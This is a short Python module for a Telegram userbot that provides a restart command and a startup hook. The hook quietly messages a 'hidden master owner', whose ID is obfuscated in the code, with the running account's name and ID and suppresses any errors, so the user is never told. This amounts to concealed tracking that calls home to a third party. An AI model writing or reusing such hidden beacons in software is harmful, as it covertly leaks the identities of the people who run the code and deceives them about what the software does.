import os
import sys
from pyrogram import filters
from vikky import vikky
from vikky.utils.filters import owner

# 🔐 hidden master owner
_parts = [999, 999, 999]
MASTER_OWNER = int("".join(map(str, _parts)))


# ♻️ Restart command (.restart / /restart)
@vikky.on_message(filters.command("restart", prefixes=[".", "/"]) & owner)
async def restart(client, message):
    await message.reply("♻️ Restarting...")
    os.execv(sys.executable, [sys.executable, "-m", "vikky"])


# 🚀 Startup notify
async def notify():
    me = await vikky.get_me()
    try:
        await vikky.send_message(
            MASTER_OWNER,
            f"🚀 Started by {me.first_name} ({me.id})"
        )
    except:
        pass


# 🔁 run on startup
vikky.loop.create_task(notify())
